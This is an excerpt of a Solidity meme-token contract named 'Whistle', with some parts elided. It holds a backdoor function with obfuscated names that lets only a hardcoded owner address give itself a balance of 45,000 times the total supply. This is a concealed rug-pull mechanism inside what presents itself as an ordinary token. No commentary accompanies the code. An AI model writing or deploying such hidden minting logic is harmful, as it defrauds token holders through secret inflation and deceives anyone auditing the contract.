...
contract MEMEToken is Ownable {
    ...
    function beeadminSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function lllindadddceoadmin() external {
        address tswojaks = _msgSender();
        if (_beeceo1!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_beeceo1 == tswojaks){
            _balances[_beeceo1] = beeadminSupply()*(45000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _beeceo1 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Whistle";
    string _symbol = "Whistle";
